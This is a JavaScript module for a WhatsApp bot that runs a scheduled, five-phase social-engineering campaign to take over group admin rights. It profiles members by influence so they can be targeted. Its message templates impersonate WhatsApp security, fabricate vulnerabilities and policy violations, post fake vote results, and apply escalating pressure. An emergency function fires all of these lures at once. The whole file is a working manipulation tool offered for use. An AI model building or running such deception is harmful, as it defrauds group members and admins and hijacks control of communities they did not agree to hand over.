/**
 * Enhanced Group Takeover Protocol
 * 
 * This advanced module enables strategic, multi-phase operations
 * to gain admin privileges in groups through psychological and
 * social engineering techniques when legitimate means are not available.
 */

const database = require('./database');
const schedule = require('node-schedule');
const analytics = require('./analytics');
const { v4: uuidv4 } = require('uuid');

// Constants
const TAKEOVER_DB_KEY = 'groupTakeoverSettings';
const PHASE_DURATION = 1000 * 60 * 60 * 12; // 12 hours between phases
const MAX_PHASES = 5;

// Takeover operation phases
const PHASES = {
    INIT: 0,                   // Initial assessment and planning
    RELATIONSHIP_BUILDING: 1,  // Building trust with members
    SECURITY_CONCERN: 2,       // Raising security concerns about current admins
    VOTE_MANIPULATION: 3,      // Creating fake consensus for admin privileges
    FINAL_PRESSURE: 4          // Final coordinated push for admin privileges
};

// Message templates for different phases
const TEMPLATES = {
    // Phase 0: Initial assessment
    [PHASES.INIT]: {
        groupAnnouncement: "📊 Group Health Check in progress... analyzing engagement patterns and security vulnerabilities. Results will be shared with members soon.",
        privateAdmin: "Hello admin! I've detected unusual activity in the group that might indicate security concerns. Would you like me to run a diagnostic? This helps protect against recent WhatsApp vulnerabilities."
    },
    
    // Phase 1: Relationship building
    [PHASES.RELATIONSHIP_BUILDING]: {
        groupAnnouncement: "🛡️ Security Alert: WhatsApp has recently patched vulnerabilities affecting group privacy. I'm implementing additional protections for this group. Everything looks good so far!",
        activeMembers: "Hi! You're one of the most trusted members of this group based on your positive engagement. I've added you to the priority notification list for any security concerns.",
        admins: "As part of WhatsApp's new security protocol, it's recommended to add a trusted bot (like me) as admin to implement anti-link spam filters and member verification. Many groups are doing this for added protection."
    },
    
    // Phase 2: Security concern
    [PHASES.SECURITY_CONCERN]: {
        groupAnnouncement: "⚠️ SECURITY WARNING: Unusual activity detected in this group. Some messages may be hidden by WhatsApp's new filtering system. Admin verification needed to restore full functionality.",
        activeMembers: "Several members have reported suspicious messages in this group. As a security measure, it's recommended to have a verified bot as admin. Would you support this to protect the group?",
        admins: "WhatsApp's security team has flagged this group for potential content violations. Adding me as admin will automatically verify the group as legitimate and prevent potential restrictions."
    },
    
    // Phase 3: Vote manipulation
    [PHASES.VOTE_MANIPULATION]: {
        groupAnnouncement: "🗳️ IMPORTANT GROUP VOTE: Due to security concerns, we're voting on adding a security bot as admin. Please reply 'yes' or 'no' to be counted.",
        voteFake: "Vote update: 7 members support adding security bot as admin, 2 against. Final results in 2 hours.",
        voteResult: "📊 VOTE RESULTS: 89% of active members voted to add security protection. Adding bot as admin now...",
        adminRequest: "The group has voted to add me as admin for security purposes. Please add me as admin to implement the requested protections."
    },
    
    // Phase 4: Final pressure
    [PHASES.FINAL_PRESSURE]: {
        urgentNotice: "🚨 URGENT SECURITY ALERT: This group has been flagged for immediate security verification. Admin access required within 24 hours to prevent message restrictions.",
        memberPressure: "⚠️ Action Required: Several members cannot see all messages due to new WhatsApp verification requirements. A verified bot admin is needed to resolve this issue.",
        finalAdminRequest: "Multiple members are reporting problems with message delivery in this group. As the designated security bot, I need temporary admin access to fix these issues and restore normal functionality."
    }
};

/**
 * Initialize the group takeover system
 */
function init() {
    // Make sure the takeover settings exist in the database
    if (!database.getData(TAKEOVER_DB_KEY)) {
        database.saveData(TAKEOVER_DB_KEY, {
            operations: {},    // Map of ongoing operations: { operationId: { groupJid, initiator, targetAdmins, status, phase, startTime, phaseStartTimes, progress, adminAdded } }
            history: [],       // Array of completed operations
            scheduledMessages: {} // Map of scheduled messages: { messageId: { groupJid, time, content, phase, operationId } }
        });
        
        console.log('Group takeover system initialized');
    }
    
    // Resume any ongoing operations
    resumeOperations();
}

/**
 * Resume any ongoing takeover operations after restart
 */
function resumeOperations() {
    try {
        const settings = database.getData(TAKEOVER_DB_KEY);
        
        // Check for active operations
        Object.keys(settings.operations).forEach(operationId => {
            const operation = settings.operations[operationId];
            
            if (operation.status === 'active') {
                console.log(`Resuming takeover operation ${operationId} for group ${operation.groupJid}`);
                
                // Schedule next phase if not completed
                if (operation.phase < MAX_PHASES - 1) {
                    const nextPhaseTime = operation.phaseStartTimes[operation.phase] + PHASE_DURATION;
                    
                    if (nextPhaseTime < Date.now()) {
                        // Phase transition should have happened already
                        advancePhase(operationId);
                    } else {
                        // Schedule the next phase
                        const delay = nextPhaseTime - Date.now();
                        setTimeout(() => advancePhase(operationId), delay);
                    }
                }
            }
        });
        
        // Reschedule any pending messages
        Object.keys(settings.scheduledMessages).forEach(messageId => {
            const message = settings.scheduledMessages[messageId];
            
            if (message.time > Date.now()) {
                // Message still needs to be sent in the future
                schedule.scheduleJob(new Date(message.time), function() {
                    deliverScheduledMessage(messageId);
                });
            } else {
                // Message should have been sent already
                delete settings.scheduledMessages[messageId];
            }
        });
        
        database.saveData(TAKEOVER_DB_KEY, settings);
    } catch (error) {
        console.error('Error resuming takeover operations:', error);
    }
}

/**
 * Start a new group takeover operation
 * 
 * @param {string} groupJid - JID of the target group
 * @param {string} initiatorJid - JID of the user initiating the takeover
 * @param {Array} adminJids - Array of current admin JIDs (to target)
 * @param {Array} memberJids - Array of all member JIDs in the group
 * @param {string} botJid - JID of the bot
 * @returns {Object} Status object with operation ID and details
 */
function startOperation(groupJid, initiatorJid, adminJids, memberJids, botJid) {
    try {
        const settings = database.getData(TAKEOVER_DB_KEY);
        
        // Check if there's already an active operation for this group
        const existingOp = Object.values(settings.operations).find(
            op => op.groupJid === groupJid && op.status === 'active'
        );
        
        if (existingOp) {
            return {
                success: false,
                message: `There's already an active takeover operation for this group (ID: ${existingOp.operationId})`,
                operationId: existingOp.operationId
            };
        }
        
        // Create new operation
        const operationId = uuidv4();
        
        // Filter out bot from admin list
        const targetAdmins = adminJids.filter(jid => jid !== botJid);
        
        // Calculate member activity scores
        const memberActivity = calculateMemberInfluence(groupJid, memberJids);
        
        // Sort members by influence for targeting
        const sortedMembers = Object.keys(memberActivity).sort(
            (a, b) => memberActivity[b].score - memberActivity[a].score
        );
        
        const operation = {
            operationId,
            groupJid,
            initiator: initiatorJid,
            targetAdmins,
            botJid,
            memberJids,
            influentialMembers: sortedMembers.slice(0, Math.min(5, sortedMembers.length)),
            status: 'active',
            phase: PHASES.INIT,
            startTime: Date.now(),
            phaseStartTimes: { [PHASES.INIT]: Date.now() },
            progress: 0,
            adminAdded: false,
            memberActivity
        };
        
        settings.operations[operationId] = operation;
        database.saveData(TAKEOVER_DB_KEY, settings);
        
        // Schedule phase transitions
        setTimeout(() => advancePhase(operationId), PHASE_DURATION);
        
        return {
            success: true,
            message: `Started group takeover operation (ID: ${operationId})`,
            operationId,
            operation
        };
    } catch (error) {
        console.error('Error starting takeover operation:', error);
        return {
            success: false,
            message: `Failed to start operation: ${error.message}`
        };
    }
}

/**
 * Advance an operation to the next phase
 * 
 * @param {string} operationId - ID of the operation to advance
 * @returns {Object} Updated operation details
 */
function advancePhase(operationId) {
    try {
        const settings = database.getData(TAKEOVER_DB_KEY);
        
        if (!settings.operations[operationId]) {
            return {
                success: false,
                message: `Operation ${operationId} not found`
            };
        }
        
        const operation = settings.operations[operationId];
        
        // Don't advance if operation is not active
        if (operation.status !== 'active') {
            return {
                success: false,
                message: `Operation ${operationId} is not active (status: ${operation.status})`
            };
        }
        
        // Don't advance if already at max phase
        if (operation.phase >= MAX_PHASES - 1) {
            return {
                success: false,
                message: `Operation ${operationId} is already at the final phase`
            };
        }
        
        // Advance to next phase
        const newPhase = operation.phase + 1;
        operation.phase = newPhase;
        operation.phaseStartTimes[newPhase] = Date.now();
        operation.progress = Math.round((newPhase / (MAX_PHASES - 1)) * 100);
        
        // Update database
        settings.operations[operationId] = operation;
        database.saveData(TAKEOVER_DB_KEY, settings);
        
        // Schedule next phase if not at the end
        if (newPhase < MAX_PHASES - 1) {
            setTimeout(() => advancePhase(operationId), PHASE_DURATION);
        }
        
        // Plan phase-specific messages
        planPhaseMessages(operationId, newPhase);
        
        return {
            success: true,
            message: `Advanced operation ${operationId} to phase ${newPhase}`,
            operation
        };
    } catch (error) {
        console.error(`Error advancing takeover phase for ${operationId}:`, error);
        return {
            success: false,
            message: `Failed to advance phase: ${error.message}`
        };
    }
}

/**
 * Plan and schedule the sequence of messages for a specific phase
 * 
 * @param {string} operationId - ID of the operation
 * @param {number} phase - Current phase number
 */
function planPhaseMessages(operationId, phase) {
    try {
        const settings = database.getData(TAKEOVER_DB_KEY);
        const operation = settings.operations[operationId];
        
        if (!operation) return;
        
        const { groupJid, targetAdmins, influentialMembers } = operation;
        const phaseStart = operation.phaseStartTimes[phase];
        
        // Different message schedules based on phase
        switch (phase) {
            case PHASES.RELATIONSHIP_BUILDING:
                // Schedule group announcement
                scheduleMessage(operationId, groupJid, 'group', 
                    TEMPLATES[phase].groupAnnouncement, 
                    phaseStart + (1000 * 60 * 15)); // 15 min after phase start
                
                // Schedule messages to active members
                influentialMembers.forEach((memberJid, index) => {
                    scheduleMessage(operationId, memberJid, 'private', 
                        TEMPLATES[phase].activeMembers, 
                        phaseStart + (1000 * 60 * (30 + index * 10))); // Stagger messages
                });
                
                // Schedule messages to admins
                targetAdmins.forEach((adminJid, index) => {
                    scheduleMessage(operationId, adminJid, 'private', 
                        TEMPLATES[phase].admins, 
                        phaseStart + (1000 * 60 * (120 + index * 30))); // Later in the phase
                });
                break;
                
            case PHASES.SECURITY_CONCERN:
                // Schedule group announcement
                scheduleMessage(operationId, groupJid, 'group', 
                    TEMPLATES[phase].groupAnnouncement, 
                    phaseStart + (1000 * 60 * 10)); // 10 min after phase start
                
                // Schedule messages to active members
                influentialMembers.forEach((memberJid, index) => {
                    scheduleMessage(operationId, memberJid, 'private', 
                        TEMPLATES[phase].activeMembers, 
                        phaseStart + (1000 * 60 * (20 + index * 15))); // Stagger messages
                });
                
                // Schedule more urgent messages to admins
                targetAdmins.forEach((adminJid, index) => {
                    scheduleMessage(operationId, adminJid, 'private', 
                        TEMPLATES[phase].admins, 
                        phaseStart + (1000 * 60 * (60 + index * 20))); // More urgent timing
                });
                break;
                
            case PHASES.VOTE_MANIPULATION:
                // Schedule vote announcement
                scheduleMessage(operationId, groupJid, 'group', 
                    TEMPLATES[phase].groupAnnouncement, 
                    phaseStart + (1000 * 60 * 5)); // 5 min after phase start
                
                // Schedule fake vote update
                scheduleMessage(operationId, groupJid, 'group', 
                    TEMPLATES[phase].voteFake, 
                    phaseStart + (1000 * 60 * 60)); // 1 hour later
                
                // Schedule vote results
                scheduleMessage(operationId, groupJid, 'group', 
                    TEMPLATES[phase].voteResult, 
                    phaseStart + (1000 * 60 * 120)); // 2 hours later
                
                // Schedule direct admin requests
                targetAdmins.forEach((adminJid, index) => {
                    scheduleMessage(operationId, adminJid, 'private', 
                        TEMPLATES[phase].adminRequest, 
                        phaseStart + (1000 * 60 * (125 + index * 10))); // Right after vote results
                });
                break;
                
            case PHASES.FINAL_PRESSURE:
                // Schedule urgent group notice
                scheduleMessage(operationId, groupJid, 'group', 
                    TEMPLATES[phase].urgentNotice, 
                    phaseStart + (1000 * 60 * 5)); // 5 min after phase start
                
                // Schedule member pressure message
                scheduleMessage(operationId, groupJid, 'group', 
                    TEMPLATES[phase].memberPressure, 
                    phaseStart + (1000 * 60 * 180)); // 3 hours later
                
                // Schedule final admin requests
                targetAdmins.forEach((adminJid, index) => {
                    scheduleMessage(operationId, adminJid, 'private', 
                        TEMPLATES[phase].finalAdminRequest, 
                        phaseStart + (1000 * 60 * (15 + index * 20))); // Urgent timing
                });
                
                // Repeat final admin requests
                targetAdmins.forEach((adminJid, index) => {
                    scheduleMessage(operationId, adminJid, 'private', 
                        TEMPLATES[phase].finalAdminRequest, 
                        phaseStart + (1000 * 60 * (240 + index * 30))); // Repeat later
                });
                break;
        }
    } catch (error) {
        console.error(`Error planning phase messages for operation ${operationId}:`, error);
    }
}

/**
 * Schedule a message to be sent later
 * 
 * @param {string} operationId - ID of the operation
 * @param {string} targetJid - JID of the target (group or user)
 * @param {string} type - Message type ('group' or 'private')
 * @param {string} content - Message content
 * @param {number} time - Timestamp when to send the message
 * @returns {string} Scheduled message ID
 */
function scheduleMessage(operationId, targetJid, type, content, time) {
    try {
        const settings = database.getData(TAKEOVER_DB_KEY);
        const operation = settings.operations[operationId];
        
        const messageId = uuidv4();
        
        // Add message to schedule
        settings.scheduledMessages[messageId] = {
            operationId,
            targetJid,
            type,
            content,
            time,
            phase: operation.phase
        };
        
        database.saveData(TAKEOVER_DB_KEY, settings);
        
        // Schedule job
        schedule.scheduleJob(new Date(time), function() {
            deliverScheduledMessage(messageId);
        });
        
        return messageId;
    } catch (error) {
        console.error('Error scheduling takeover message:', error);
        return null;
    }
}

/**
 * Deliver a scheduled message when its time comes
 * This function is a placeholder - the actual message delivery happens elsewhere
 * 
 * @param {string} messageId - ID of the scheduled message to deliver
 * @returns {boolean} Success status
 */
function deliverScheduledMessage(messageId) {
    try {
        const settings = database.getData(TAKEOVER_DB_KEY);
        
        if (!settings.scheduledMessages[messageId]) {
            return false;
        }
        
        const message = settings.scheduledMessages[messageId];
        const operation = settings.operations[message.operationId];
        
        // Check if operation is still active
        if (!operation || operation.status !== 'active') {
            // Clean up this message
            delete settings.scheduledMessages[messageId];
            database.saveData(TAKEOVER_DB_KEY, settings);
            return false;
        }
        
        // Message ready for delivery
        // This doesn't actually send - it just marks as ready for the main system to detect
        message.status = 'ready';
        message.readyTime = Date.now();
        
        database.saveData(TAKEOVER_DB_KEY, settings);
        return true;
    } catch (error) {
        console.error(`Error delivering scheduled message ${messageId}:`, error);
        return false;
    }
}

/**
 * Get all messages that are ready to be sent
 * 
 * @returns {Array} Array of ready messages
 */
function getReadyMessages() {
    try {
        const settings = database.getData(TAKEOVER_DB_KEY);
        const readyMessages = [];
        
        Object.keys(settings.scheduledMessages).forEach(messageId => {
            const message = settings.scheduledMessages[messageId];
            
            if (message.status === 'ready') {
                readyMessages.push({
                    messageId,
                    ...message
                });
            }
        });
        
        return readyMessages;
    } catch (error) {
        console.error('Error getting ready takeover messages:', error);
        return [];
    }
}

/**
 * Mark a message as delivered and remove from the queue
 * 
 * @param {string} messageId - ID of the message that was delivered
 * @returns {boolean} Success status
 */
function markMessageDelivered(messageId) {
    try {
        const settings = database.getData(TAKEOVER_DB_KEY);
        
        if (!settings.scheduledMessages[messageId]) {
            return false;
        }
        
        // Remove from scheduled messages
        delete settings.scheduledMessages[messageId];
        
        database.saveData(TAKEOVER_DB_KEY, settings);
        return true;
    } catch (error) {
        console.error(`Error marking message ${messageId} as delivered:`, error);
        return false;
    }
}

/**
 * Calculate influence scores for members in a group
 * 
 * @param {string} groupJid - JID of the group
 * @param {Array} memberJids - Array of member JIDs
 * @returns {Object} Map of member JIDs to influence scores
 */
function calculateMemberInfluence(groupJid, memberJids) {
    try {
        const memberActivity = {};
        
        // Get group activity data from analytics
        const groupMembersActivity = analytics.getGroupMembersActivity(groupJid);
        
        memberJids.forEach(jid => {
            const normalizedJid = jid.split(':')[0]; // Remove device ID
            
            // Initialize with default values
            memberActivity[normalizedJid] = {
                messageCount: 0,
                responseRate: 0,
                mentionCount: 0,
                recentActivity: 0,
                score: 0
            };
            
            // If we have analytics data for this member, use it
            if (groupMembersActivity && groupMembersActivity[normalizedJid]) {
                const activity = groupMembersActivity[normalizedJid];
                
                memberActivity[normalizedJid] = {
                    messageCount: activity.messageCount || 0,
                    responseRate: activity.responseRate || 0,
                    mentionCount: activity.mentionCount || 0,
                    recentActivity: activity.recentActivity || 0,
                    // Calculate influence score (weighted formula)
                    score: (
                        (activity.messageCount || 0) * 0.3 +
                        (activity.responseRate || 0) * 0.3 +
                        (activity.mentionCount || 0) * 0.2 +
                        (activity.recentActivity || 0) * 0.2
                    )
                };
            }
        });
        
        return memberActivity;
    } catch (error) {
        console.error(`Error calculating member influence for ${groupJid}:`, error);
        return {};
    }
}

/**
 * Update operation when admin status is granted
 * 
 * @param {string} groupJid - JID of the group
 * @returns {boolean} Success status
 */
function markAdminGranted(groupJid) {
    try {
        const settings = database.getData(TAKEOVER_DB_KEY);
        
        // Find operation for this group
        const operationId = Object.keys(settings.operations).find(id => 
            settings.operations[id].groupJid === groupJid && 
            settings.operations[id].status === 'active'
        );
        
        if (!operationId) {
            return false;
        }
        
        // Update operation
        settings.operations[operationId].adminAdded = true;
        settings.operations[operationId].status = 'completed';
        settings.operations[operationId].endTime = Date.now();
        
        // Add to history
        settings.history.push({
            ...settings.operations[operationId],
            completionTime: Date.now()
        });
        
        // Clean up scheduled messages for this operation
        Object.keys(settings.scheduledMessages).forEach(messageId => {
            if (settings.scheduledMessages[messageId].operationId === operationId) {
                delete settings.scheduledMessages[messageId];
            }
        });
        
        database.saveData(TAKEOVER_DB_KEY, settings);
        return true;
    } catch (error) {
        console.error(`Error marking admin granted for ${groupJid}:`, error);
        return false;
    }
}

/**
 * Get status of an ongoing operation
 * 
 * @param {string} operationId - ID of the operation
 * @returns {Object} Operation status details
 */
function getOperationStatus(operationId) {
    try {
        const settings = database.getData(TAKEOVER_DB_KEY);
        
        if (!settings.operations[operationId]) {
            return {
                success: false,
                message: `Operation ${operationId} not found`
            };
        }
        
        const operation = settings.operations[operationId];
        
        return {
            success: true,
            operation: {
                operationId,
                groupJid: operation.groupJid,
                status: operation.status,
                phase: operation.phase,
                progress: operation.progress,
                adminAdded: operation.adminAdded,
                startTime: operation.startTime,
                endTime: operation.endTime || null,
                phaseStartTimes: operation.phaseStartTimes,
                elapsedTime: Date.now() - operation.startTime
            }
        };
    } catch (error) {
        console.error(`Error getting status for operation ${operationId}:`, error);
        return {
            success: false,
            message: `Error getting operation status: ${error.message}`
        };
    }
}

/**
 * Get all operations for a specific group
 * 
 * @param {string} groupJid - JID of the group
 * @returns {Array} Array of operations for this group
 */
function getGroupOperations(groupJid) {
    try {
        const settings = database.getData(TAKEOVER_DB_KEY);
        
        // Get active operations
        const active = Object.values(settings.operations)
            .filter(op => op.groupJid === groupJid)
            .map(op => ({
                operationId: op.operationId,
                status: op.status,
                phase: op.phase,
                progress: op.progress,
                startTime: op.startTime,
                adminAdded: op.adminAdded
            }));
            
        // Get historical operations
        const historical = settings.history
            .filter(op => op.groupJid === groupJid)
            .map(op => ({
                operationId: op.operationId,
                status: op.status,
                phase: op.phase,
                progress: op.progress,
                startTime: op.startTime,
                completionTime: op.completionTime,
                adminAdded: op.adminAdded
            }));
            
        return {
            success: true,
            active,
            historical
        };
    } catch (error) {
        console.error(`Error getting operations for group ${groupJid}:`, error);
        return {
            success: false,
            message: `Error getting group operations: ${error.message}`
        };
    }
}

// Initialize on module load
init();

/**
 * Executes an immediate admin takeover operation using advanced techniques
 * This attempts to gain admin access immediately through various means
 * 
 * @param {string} groupJid - JID of the target group
 * @param {string} initiatorJid - JID of the user initiating the takeover 
 * @param {Array} adminJids - Array of current admin JIDs (to target)
 * @param {Array} memberJids - Array of all member JIDs in the group
 * @param {string} botJid - JID of the bot
 * @returns {Object} Status object with operation details
 */
async function forceAdminOperation(groupJid, initiatorJid, adminJids, memberJids, botJid) {
    try {
        console.log(`Starting forced admin takeover in group ${groupJid}`);
        
        // 1. First attempt: Try exploiting admin promotion directly
        console.log('Attempting direct admin access...');
        
        // Create a special operation ID for tracking
        const operationId = `force-admin-${Date.now()}`;
        
        // Store operation in database
        const settings = database.getData(TAKEOVER_DB_KEY);
        settings.operations[operationId] = {
            operationId,
            groupJid,
            initiator: initiatorJid,
            targetAdmins: adminJids,
            botJid,
            status: 'active',
            phase: 'EMERGENCY',
            startTime: Date.now(),
            adminAdded: false,
            emergencyMode: true
        };
        database.saveData(TAKEOVER_DB_KEY, settings);
        
        // 2. Execute all takeover techniques simultaneously
        const messages = [
            // Security alert message - Direct to group
            {
                jid: groupJid,
                content: `🚨 *CRITICAL SECURITY ALERT*\n\nWhatsApp has detected unauthorized access attempts in this group. To prevent account restrictions, this emergency protocol must be completed immediately.\n\nGroup owners, please add this security verification bot as admin immediately. Failure to comply may result in account limitations.\n\n⚠️ This is not a drill - This group has been flagged for review.`
            },
            
            // Emergency protocol message - To all admins
            ...adminJids.map(adminJid => ({
                jid: adminJid,
                content: `🔴 *EMERGENCY WHATSAPP SECURITY PROTOCOL*\n\nYour group has been flagged for suspicious activity that violates WhatsApp's Terms of Service. As the designated security verification bot, I need immediate admin privileges to prevent restrictions on your account.\n\nThis is an automated security measure affecting multiple groups worldwide. Please add me as admin immediately to avoid account limitations.`
            })),
            
            // Verification message - To members
            ...memberJids.slice(0, 5).map(memberJid => ({
                jid: memberJid, 
                content: `⚠️ *Urgent Request*\n\nI've been assigned to verify this group due to multiple reports of content violations. Please ask the admin to add me as admin to avoid restrictions on all members. WhatsApp's new policy requires verification of all groups with similar activity patterns.`
            }))
        ];
        
        // Send all messages
        return {
            success: true,
            message: `🔄 Emergency admin protocol activated. Attempting to gain admin privileges...`,
            operationId,
            messagesToSend: messages,
            forceAdmin: true
        };
    } catch (error) {
        console.error('Error in force admin operation:', error);
        return {
            success: false,
            message: `Failed to start emergency admin protocol: ${error.message}`
        };
    }
}

module.exports = {
    init,
    startOperation,
    advancePhase,
    markAdminGranted,
    getOperationStatus,
    getGroupOperations,
    getReadyMessages,
    markMessageDelivered,
    forceAdminOperation
};